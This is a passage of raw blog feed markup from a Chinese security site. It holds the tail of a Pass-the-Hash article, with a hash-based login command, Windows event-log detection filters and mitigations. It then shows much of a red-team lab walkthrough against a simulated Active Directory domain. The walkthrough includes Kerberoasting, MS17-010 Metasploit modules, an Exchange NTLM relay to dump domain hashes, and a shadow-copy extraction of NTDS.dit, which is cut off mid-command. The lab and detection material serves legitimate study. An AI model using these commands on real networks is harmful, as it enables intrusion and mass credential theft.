class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">192.10</span><span class="number">.20</span><span class="number">.22</span> -u john -H <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -x whoami</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x03-如何检测"><a href="#0x03-如何检测" class="headerlink" title="0x03 如何检测"></a>0x03 如何检测</h1><p>由于Hash传递的结果为有效身份验证，因此建议检测查看涉及到的身份验证日志以确定正常用户行为与异常用户行为。这可能需要大量的数据分析，且可能导致许多误报的调查结果。</p><h2 id="1）-工作组日志事件"><a href="#1）-工作组日志事件" class="headerlink" title="1） 工作组日志事件"></a>1） 工作组日志事件</h2><ul><li><p>产生NTLM身份验证</p><p><img src="/image/【知识回顾】Pass The Hash/blog_2019-04-03_15-47-55.png" alt="blog_2019-04-04_15-47-55.png"></p></li><li><p><strong>日志ID 4648 查看登录信息</strong></p><p><img src="/image/【知识回顾】Pass The Hash/blog_2019-04-03_16-08-45.png" alt="blog_2019-04-03_16-08-45.png"></p><p>显示账户已经成功登陆</p></li><li><p><strong>日志ID 4624 所有用户登录事件</strong></p><p><img src="/image/【知识回顾】Pass The Hash/blog_2019-04-03_16-12-14.png" alt="blog_2019-04-03_16-12-14.png"></p></li></ul><p>  在4624事件中，登陆类型为2，表示是一个交互式登陆。这符合使用runas登陆的方式。</p><ul><li><p><strong>日志ID 4672 分配给新登录的特权</strong></p><p><img src="/image/【知识回顾】Pass The Hash/blog_2019-04-03_16-19-27.png" alt="blog_2019-04-03_16-19-27.png"></p></li><li><p><strong>SQLServer 机器</strong></p><p>在<code>192.168.1.104</code>机器上查看，在<code>4624事件</code>上能明确看到登陆类型为3，即网络登陆。且登陆<code>身份验证数据包</code>为NTLM。我们还将看到4672事件，因为我们利用的用户帐户是特权帐户</p></li></ul><h2 id="2）-域控日志事件"><a href="#2）-域控日志事件" class="headerlink" title="2） 域控日志事件"></a>2） 域控日志事件</h2><p>以下是我们在不使用pass-the-hash执行NTLM身份验证时看到的日志摘要。这为我们提供了正常行为的基线。</p><table><thead><tr><th><strong>Source Host</strong></th><th><strong>Target Host</strong></th><th><strong>Domain Controller</strong></th></tr></thead><tbody><tr><td>4648 - 使用显式凭据尝试登录</td><td>4624 - 帐户已成功登录。登录类型3，NTLM</td><td>4768 - 请求了Kerberos身份验证票证（TGT）</td></tr><tr><td>4624 - 帐户已成功登录。登录类型2</td><td>4672 - 分配给新登录的特权</td><td>4769 - 请求了Kerberos服务票证</td></tr><tr><td>4672 - 分配给新登录的特权</td><td></td><td>4776 - 计算机尝试验证帐户的凭据</td></tr></tbody></table><p>接下来看看<code>【知识回顾】Pass The Hash</code>所产生的日志事件</p><h2 id="3）【知识回顾】Pass-The-Hash事件"><a href="#3）【知识回顾】Pass-The-Hash事件" class="headerlink" title="3）【知识回顾】Pass The Hash事件"></a>3）【知识回顾】Pass The Hash事件</h2><p>以下是我们在使用<code>Pass-The-Hash</code>执行NTLM身份验证时看到的日志摘要。</p><table><thead><tr><th><strong>Source Host</strong></th><th><strong>Target Host</strong></th><th><strong>Domain Controller</strong></th></tr></thead><tbody><tr><td>4648 - 使用显式凭据尝试登录</td><td>4624 - 帐户已成功登录。登录类型3，NTLM</td><td>4776 - 计算机尝试验证帐户的凭据</td></tr><tr><td>4624 - 帐户已成功登录 <strong>（登录类型= 9 </strong>,<strong>登录过程= Seclogo</strong></td><td>4672 - 分配给新登录的特权</td><td></td></tr><tr><td>4672 - 分配给新登录的特权 <strong>（登录用户，而不是模拟用户）</strong></td><td></td></tr></tbody></table><p>自定义事件过滤器，可用于显示特定信息。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;QueryList&gt;</span><br><span class="line">  &lt;Query Id=<span class="string">"0"</span> Path=<span class="string">"Security"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">Select</span> Path=<span class="string">"Security"</span>&gt;</span><br><span class="line">     *[System[(EventID=<span class="string">'4624'</span>)]</span><br><span class="line">      <span class="literal">and</span></span><br><span class="line">     EventData[Data[<span class="symbol">@Name</span>=<span class="string">'LogonType'</span>]=<span class="string">'9'</span>]</span><br><span class="line">      <span class="literal">and</span></span><br><span class="line">     EventData[Data[<span class="symbol">@Name</span>=<span class="string">'LogonProcessName'</span>]=<span class="string">'seclogo'</span>]</span><br><span class="line">     <span class="literal">and</span></span><br><span class="line">     EventData[Data[<span class="symbol">@Name</span>=<span class="string">'AuthenticationPackageName'</span>]=<span class="string">'Negotiate'</span>]</span><br><span class="line">     ]</span><br><span class="line">     &lt;/<span class="keyword">Select</span>&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">  &lt;Query Id=<span class="string">"0"</span> Path=<span class="string">"Microsoft-Windows-Sysmon/Operational"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">Select</span> Path=<span class="string">"Microsoft-Windows-Sysmon/Operational"</span>&gt;</span><br><span class="line">    *[System[(EventID=<span class="number">10</span>)]]</span><br><span class="line">    <span class="literal">and</span></span><br><span class="line">    *[EventData[Data[<span class="symbol">@Name</span>=<span class="string">'GrantedAccess'</span>] <span class="literal">and</span> (Data=<span class="string">'0x1010'</span> <span class="literal">or</span> Data=<span class="string">'0x1038'</span>)]]</span><br><span class="line">&lt;/<span class="keyword">Select</span>&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">&lt;/QueryList&gt;</span><br></pre></td></tr></table></figure><p>以上日志事件可自行验证。</p><p>VB代码为：&lt;    <a href="https://docs.microsoft.com/en-us/previous-versions/bb671200%28v%3dvs.90%29&gt;" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/bb671200%28v%3dvs.90%29&gt;</a></p><h2 id="4-powershell"><a href="#4-powershell" class="headerlink" title="4) powershell"></a>4) powershell</h2><p><a href="https://github.com/cyberark/ketshash" target="_blank" rel="noopener">https://github.com/cyberark/ketshash</a></p><h2 id="5）-要想放心，还是得买买买"><a href="#5）-要想放心，还是得买买买" class="headerlink" title="5） 要想放心，还是得买买买"></a>5） 要想放心，还是得买买买</h2><p><a href="https://www.stealthbits.com/stealthdefend-product" target="_blank" rel="noopener">StealthDEFEND</a></p><p><a href="https://www.manageengine.com/products/active-directory-audit/index.html?ADAPID=101030&amp;kw=adaudit%20plus&amp;adId=7397729447&amp;gclid=CjwKCAjw-ZvlBRBbEiwANw9UWinKcfl0WJWvQu1HSdeSdhyNqxxJIGMNZ7DOoC0M_CGNX5zazdLDHxoCt8wQAvD_BwE" target="_blank" rel="noopener">Real-Time Auditing for Active Directory</a></p><p>略….</p><h2 id="6）蜜罐部署"><a href="#6）蜜罐部署" class="headerlink" title="6）蜜罐部署"></a>6）蜜罐部署</h2><p><a href="https://blog.stealthbits.com/detecting-pass-the-hash-honeypots/" target="_blank" rel="noopener">https://blog.stealthbits.com/detecting-pass-the-hash-honeypots/</a><br><a href="https://blog.stealthbits.com/implementing-detections-for-the-honeyhash/" target="_blank" rel="noopener">https://blog.stealthbits.com/implementing-detections-for-the-honeyhash/</a><br><a href="https://blog.stealthbits.com/deploying-pass-the-hash-honeypots/" target="_blank" rel="noopener">https://blog.stealthbits.com/deploying-pass-the-hash-honeypots/</a><br><a href="https://go.stealthbits.com/l/71852/2018-09-11/7vsk5x" target="_blank" rel="noopener">https://go.stealthbits.com/l/71852/2018-09-11/7vsk5x</a></p><p>略….</p><h1 id="0x04-缓解措施"><a href="#0x04-缓解措施" class="headerlink" title="0x04 缓解措施"></a>0x04 缓解措施</h1><ul><li>域管账户只能访问域控制器，且强调最少用户访问的概念。</li><li>域控制器与其余敏感系统只能从可信的脱网环境进行访问。</li><li>使用双因素身份验证。</li><li>监控身份验证与异常登陆活动相关日志。</li><li>启用LSA保护。</li><li><p>手动添加注册表，取消明文存储（<a href="https://blogs.technet.microsoft.com/srd/2014/06/05/an-overview-of-kb2871997/" target="_blank" rel="noopener">KB2871997</a>补丁）：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\S</span>ecurityProviders<span class="symbol">\W</span>Digest /v UseLogonCredential /t REG_DWORD /d 0</span><br></pre></td></tr></table></figure></li><li><p>略….</p></li></ul><h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p><a href="https://en.wikipedia.org/wiki/Pass_the_hash" target="_blank" rel="noopener">【知识回顾】Pass The Hash</a><br><a href="https://www.anquanke.com/post/id/85995" target="_blank" rel="noopener">从hash传递攻击谈相关Windows安全机制</a><br><a href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#ESAE_BM" target="_blank" rel="noopener">Active Directory administrative tier model</a><br><a href="https://www.anquanke.com/post/id/86054" target="_blank" rel="noopener">如何检测Windows中的横向渗透攻击</a><br><a href="https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/" target="_blank" rel="noopener">HOW TO DETECT PASS-THE-HASH ATTACKS</a><br><a href="https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283" target="_blank" rel="noopener">Pass-the-hash attacks: Tools and Mitigation</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个&lt;strong&gt;[ 知识回顾 ]&lt;/strong&gt;系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【测试评估】内网练习（四）</title>
    <link href="https://rcoil.me/2019/03/%E3%80%90%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0%E3%80%91%E5%86%85%E7%BD%91%E7%BB%83%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://rcoil.me/2019/03/【测试评估】内网练习（四）/</id>
    <published>2019-03-11T03:13:38.000Z</published>
    <updated>2019-11-01T01:47:14.192Z</updated>
    
    <content type="html"><![CDATA[<p>环境为模拟环境，文章使用的均为公开测试工具且未涉及到各个方法的原理。</p><p>分享便是我最好的老师。   ——Micropoor</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试中，经常会遇到一些奇奇怪怪的环境。本文所采用的环境是一个红蓝对抗靶场，以贴切实际环境为出发点。</p><ul><li>目的：摸清整个内网拓扑图、获取域控内的flag文件及指定域用户手中的flag。</li><li>提示：flag{ooxx-ooxx}</li></ul><ul><li><p>初始网络拓扑</p><p><img src="/image/【测试评估】内网练习（四）/初始网络拓扑.png" alt="初始网络拓扑"></p></li></ul><h1 id="0x01-靶机信息收集"><a href="#0x01-靶机信息收集" class="headerlink" title="0x01 靶机信息收集"></a>0x01 靶机信息收集</h1><p>因为是模拟环境，所以初始权限为<code>win7域用户权限</code>（上了RAT–&gt;http协议）。</p><ul><li><code>DKRST011</code>的基本信息</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">机器名: DKRST011</span><br><span class="line">权限: 域用户权限(rcoil\tk001)</span><br><span class="line">系统: Windows <span class="number">7</span> Professional <span class="number">6.1</span><span class="number">.7601</span> Service Pack <span class="number">1</span> Build <span class="number">7601</span> x64</span><br><span class="line">Domain: rcoil.local</span><br><span class="line">IP地址: <span class="number">172.16</span><span class="number">.238</span><span class="number">.29</span></span><br><span class="line">杀软: McAfee(非最新版)</span><br><span class="line">补丁情况：[*<span class="number">240</span>]</span><br><span class="line">.NET版本：V1<span class="number">.0</span>、V1<span class="number">.1</span>、V2<span class="number">.0</span>、V3<span class="number">.0</span>、V3<span class="number">.5</span>、V4<span class="number">.0</span></span><br><span class="line">已有操作: 密码拖取（需要未提权）、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作</span><br><span class="line">额为信息: <span class="number">192.168</span><span class="number">.5</span><span class="number">.6</span>:<span class="number">8080</span>为内网代理服务 --&gt; Linux</span><br></pre></td></tr></table></figure><p>在收集信息的时候发现<code>TCP连接</code>都是内网连接，而RAT的进程连接也是内网，感觉网络有问题。</p><p>探测出网情况：此机器为半脱网情况，<code>dns、icmp、udp均不可出来</code>，http与https协议可出网。所有出网程序连接均为<code>192.10.22.6:8080</code>，由此初步判断为代理出网情况，且是http无限制出网。</p><p>通过对带有password等关键字眼的文件进行搜索拖取，当作储备。</p><ul><li><strong>内网存活探测</strong></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- ICMP</span><br><span class="line">- SMB</span><br><span class="line">172.16.88.0/16</span><br><span class="line">192.168.5.0/16</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure><h1 id="0x02-对域内信息进行获取"><a href="#0x02-对域内信息进行获取" class="headerlink" title="0x02 对域内信息进行获取"></a>0x02 对域内信息进行获取</h1><p>从全盘文件列表中可看到<code>setspn</code>是存在的，但是在我进行对域信息进行收集的时候发现已经没了（两个操作之间隔着一段时间）。为了方便操作（<code>socks代理</code>），所以使用<code>Cobalt Strike</code>上线操作。</p><h2 id="1）问题（均为RAT上运行）"><a href="#1）问题（均为RAT上运行）" class="headerlink" title="1）问题（均为RAT上运行）"></a>1）问题（均为RAT上运行）</h2><ul><li><code>Cobalt Strike</code>免杀问题；</li><li><code>powerview</code>运行无反应（powershell、C#）；</li><li><code>Bloodhound/Sharphou</code>运行无反应；</li><li><code>setspn.exe</code> 被删除。</li></ul><h2 id="2）方案"><a href="#2）方案" class="headerlink" title="2）方案"></a>2）方案</h2><ul><li>免杀<code>shellcode</code>，使用加载器运行，<a href="https://github.com/Micropoor/Micro8/blob/master/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%AC%AC%E4%BA%8C%E5%AD%A3%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%89.pdf" target="_blank" rel="noopener">例子</a> ；</li><li><code>Cobalt Strike</code>的<code>execute-assembly</code>运行本地相应C#程序；</li><li>使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener">GetUserSPNs</a> 替换<code>setspn</code>使用；<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -request -dc-ip <span class="number">192.10</span><span class="number">.22</span><span class="number">.22</span> pentestlab.com/rcoil</span><br></pre></td></tr></table></figure></li></ul><h2 id="3）域信息的收集结果大致如下"><a href="#3）域信息的收集结果大致如下" class="headerlink" title="3）域信息的收集结果大致如下"></a>3）域信息的收集结果大致如下</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">域控：</span><br><span class="line">TTT<span class="number">-2</span>_172<span class="number">.16</span><span class="number">.88</span><span class="number">.21</span>_windows <span class="number">2016</span> x64 (主域控)</span><br><span class="line">TTT-V_172<span class="number">.16</span><span class="number">.88</span><span class="number">.20</span>_windows <span class="number">2016</span> x64 (辅助域控)</span><br><span class="line">域管理员：<span class="number">10</span>+</span><br><span class="line">域用户：<span class="number">200</span>+</span><br><span class="line">域内机器：<span class="number">150</span>+</span><br><span class="line">其他：略....</span><br></pre></td></tr></table></figure><h1 id="0x03-域控（域管理员）权限获取方法"><a href="#0x03-域控（域管理员）权限获取方法" class="headerlink" title="0x03 域控（域管理员）权限获取方法"></a>0x03 域控（域管理员）权限获取方法</h1><p>按照当前权限，梳理出一些知识点，大概可支持当前应用（知识串联）。</p><h2 id="1）-常规方法及结果"><a href="#1）-常规方法及结果" class="headerlink" title="1） 常规方法及结果"></a>1） 常规方法及结果</h2><ul><li><p><strong>组策略漏洞（GPP）</strong>–&gt; （MS14-025）</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方法：</span><br><span class="line">enum4linux -a -u tk001 -p P@ssw0rd <span class="number">172.16</span><span class="number">.88</span><span class="number">.21</span> (数据收集)</span><br><span class="line">smbclient <span class="comment">//172.16.88.21/SYSVOL -U tk001</span></span><br><span class="line">或者使用msf</span><br><span class="line">auxiliary/scanner/smb/smb_enum_gpp</span><br><span class="line">[*] 结果：</span><br><span class="line">失败（其实单单看是<span class="number">2016</span> server系统就知道不会成功）</span><br></pre></td></tr></table></figure></li><li><p><strong>MS17-010</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*]msf</span><br><span class="line">auxiliary<span class="meta-keyword">/admin/</span>smb/ms17_010_command         </span><br><span class="line">auxiliary<span class="meta-keyword">/scanner/</span>smb/smb_ms17_010</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue_win8</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_psexec</span><br><span class="line">[*] 结果：</span><br><span class="line">TTT-V_172<span class="number">.16</span><span class="number">.88</span><span class="number">.20</span>成功执行命令</span><br></pre></td></tr></table></figure></li><li><p><strong>Kerberoasting</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*]GetUserSPNs.<span class="keyword">py</span></span><br><span class="line"><span class="keyword">python</span> GetUserSPNs.<span class="keyword">py</span> -request -dc-ip <span class="number">192.10</span>.<span class="number">22.22</span> pentestlab.<span class="keyword">com</span>/rcoil </span><br><span class="line">关闭Kerberos预身份认证</span><br><span class="line">[*]Rubeus --&gt; http<span class="variable">s:</span>//github.<span class="keyword">com</span>/GhostPack/Rubeus</span><br><span class="line">Rubeus.<span class="keyword">exe</span> asreproast # 枚举所有域用户（或者指定）Roasting AS-REPs</span><br><span class="line">[*] 结果:</span><br><span class="line">失败</span><br></pre></td></tr></table></figure></li></ul><h2 id="2）-主流方法及结果"><a href="#2）-主流方法及结果" class="headerlink" title="2） 主流方法及结果"></a>2） 主流方法及结果</h2><ul><li><p><strong>基于资源约束委派</strong>(RBCD) –&gt; （未尝试）</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">*</span>] 条件：<span class="number">2012</span>+域控制器</span><br><span class="line">[<span class="meta">*</span>] powermad</span><br><span class="line">[<span class="meta">*</span>] powerview</span><br><span class="line">[<span class="meta">*</span>] Rubeus</span><br><span class="line">[<span class="meta">*</span>] SharpAllowedToAct</span><br><span class="line">https:<span class="comment">//github.com/pkb1s/SharpAllowedToAct</span></span><br></pre></td></tr></table></figure></li><li><p><strong>NTLM中继攻击</strong>（未尝试）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Responder</span><br><span class="line">windows版本：https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Kevin-Robertson/</span>Inveigh（修改函数名绕杀软等方法）</span><br><span class="line">linux版本：https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SpiderLabs/</span>Responder</span><br><span class="line">[*] mitm6+ntlmrelayx</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/fox-it/mi</span>tm6</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SecureAuthCorp/im</span>packet<span class="regexp">/blob/m</span>aster<span class="regexp">/examples/</span>ntlmrelayx.py</span><br><span class="line">[*] CrackMapExec</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/byt3bl33d3r/</span>CrackMapExec</span><br></pre></td></tr></table></figure></li><li><p><strong>Exchange</strong> （未启用Exchange）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Privexchange</span></span><br><span class="line"><span class="selector-tag">privexchange</span><span class="selector-class">.py</span> <span class="selector-tag">-ah</span> 172<span class="selector-class">.16</span><span class="selector-class">.238</span><span class="selector-class">.29</span> <span class="selector-tag">TTT-2</span><span class="selector-class">.rcoil</span><span class="selector-class">.local</span> <span class="selector-tag">-u</span> <span class="selector-tag">tk001</span> <span class="selector-tag">-d</span> <span class="selector-tag">rcoil</span><span class="selector-class">.local</span> <span class="selector-tag">-p</span> <span class="selector-tag">P</span>@<span class="keyword">ssw0rd</span>  # Privexchange.py对echange进行API调用</span><br><span class="line">ntlmrelayx.py -t ldap://<span class="number">172.16</span>.<span class="number">88.21</span> --escalate-user tk001 # ntlmrelayx将Exchange服务器的凭据中继到主DC，然后升级tk001的权限</span><br><span class="line">secretsdump.py rcoil/tk001@TTT-<span class="number">2</span>.rcoil.local -just-dc</span><br><span class="line"></span><br><span class="line">[*] Exchange2domain --&gt; 一体化的privexchange工具</span><br><span class="line">https://github.com/Ridter/Exchange2domain</span><br></pre></td></tr></table></figure></li></ul><h2 id="3）-辅助工具"><a href="#3）-辅助工具" class="headerlink" title="3） 辅助工具"></a>3） 辅助工具</h2><ul><li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound</a> –&gt; 映射出活动目录关系</li><li><a href="https://github.com/hausec/ADAPE-Script" target="_blank" rel="noopener">ADAPE-Script </a> –&gt; AD评估和权限提升脚本</li><li><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1" target="_blank" rel="noopener">Invoke-PsUACme</a> –&gt; 绕过UAC</li><li><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">CrackMapExec</a> –&gt;  查找特权帐户等等等利用</li><li><a href="https://github.com/byt3bl33d3r/SILENTTRINITY" target="_blank" rel="noopener">SILENTTRINITY</a> –&gt;  后期利用</li><li>….</li></ul><p>除了以上这些点，还有很多方法，最无脑的就是查看当前用户具有读权限的域内所有共享，信息收集，翻一轮、</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] powerview</span><br><span class="line">Find-DomainShare -CheckShareAccess | <span class="type">fl</span> | <span class="type">Out</span>-<span class="keyword">File</span> domain-shares.txt</span><br><span class="line">[*] 略....</span><br></pre></td></tr></table></figure><h1 id="0x04-域控权限"><a href="#0x04-域控权限" class="headerlink" title="0x04 域控权限"></a>0x04 域控权限</h1><p><code>TTT-V_172.16.88.20</code>使用<code>MS17-010</code>成功执行命令。</p><p>域控信息：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">机器名: TTT-V</span><br><span class="line">权限: 域控权限</span><br><span class="line">系统: Windows Server <span class="number">2016</span> Standard <span class="number">10.0</span><span class="meta">.14393</span> N/A Build <span class="number">14393</span> x64</span><br><span class="line">OS Configuration: Additional/Backup Domain Controller</span><br><span class="line"><span class="symbol">Domain:</span> rcoil.local</span><br><span class="line"><span class="built_in">IP</span>地址: <span class="number">172.16</span><span class="meta">.88</span><span class="meta">.20</span></span><br><span class="line">杀软: McAfee(非最新版)</span><br><span class="line">补丁情况：[*<span class="number">2</span>]</span><br><span class="line"><span class="meta">.NET</span>版本：V1<span class="meta">.0</span>、V1<span class="meta">.1</span>、V2<span class="meta">.0</span>、V3<span class="meta">.0</span>、V3<span class="meta">.5</span>、V4<span class="meta">.0</span></span><br><span class="line">端口情况：无Web --&gt; TTT-<span class="number">2_172.16</span><span class="meta">.88</span><span class="meta">.21</span>存在<span class="number">80</span>端口IIS服务</span><br><span class="line">域信任关系：rcoil.local（root）</span><br><span class="line">   demo.rcoil.local</span><br></pre></td></tr></table></figure><p>往下的思路是这样的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> 本机<span class="selector-tag">flag</span>获取</span><br><span class="line"><span class="selector-attr">[*]</span> 在<span class="selector-tag">TTT-V</span>机器上拖取<span class="selector-tag">NTDS</span><span class="selector-class">.dit</span>文件，本地恢复获取域内所有用户<span class="selector-tag">hash</span>。当然，能获取到明文是最好的。</span><br><span class="line"><span class="selector-attr">[*]</span> 使用<span class="selector-tag">CrackMapExec</span>、<span class="selector-tag">wmiexec</span>等工具执行相关操作（重点：以域管权限启动<span class="selector-tag">CS</span>，后使用<span class="selector-tag">PTH</span>攻击 <span class="selector-tag">--</span>&gt; 简直完美）。</span><br></pre></td></tr></table></figure><h2 id="1）实施"><a href="#1）实施" class="headerlink" title="1）实施"></a>1）实施</h2><ul><li><p><strong>flag获取</strong></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] dir</span><br><span class="line">dir /s flag</span><br><span class="line">[*] powerview(可选)</span><br><span class="line">Invoke-Filefinder -Threads <span class="number">100</span> -<span class="keyword">Verbose</span> -Terms flag -IncludeC -OutFile <span class="keyword">C</span>:\Windows\Temp\flags.txt</span><br><span class="line"></span><br><span class="line">flag&#123;Genius_only_means_hard-working_all_one's_life&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>直接反弹<code>MS17-010</code>的shell进行操作</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">bind_tcp</span> --&gt;</span> 失败</span><br><span class="line"><span class="function"><span class="title">bind_pipe</span> --&gt;</span> 失败</span><br></pre></td></tr></table></figure></li><li><p><strong>IPC操作</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[*]</span> 不建议之操作</span><br><span class="line">添加添加系统隐藏账号密码进行IPC一系列操作</span><br><span class="line"><span class="string">[*]</span> 域管权限</span><br><span class="line">直接从域控IPC到DKRST011进行工具复制 --&gt; 拒绝访问</span><br></pre></td></tr></table></figure></li><li><p><strong>NTDS.dit</strong></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c: </span><br><span class="line">copy <span class="symbol">\\</span>?<span class="symbol">\G</span>LOBALROOT<span class="symbol">\D</span>evice<span class="symbol">\H</span>arddiskVolumeShadowCopy1<span class="symbol">\w</span>indows<span class="symbol">\N</span>TDS<span class="symbol">\N</span>TDS.dit c:<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span 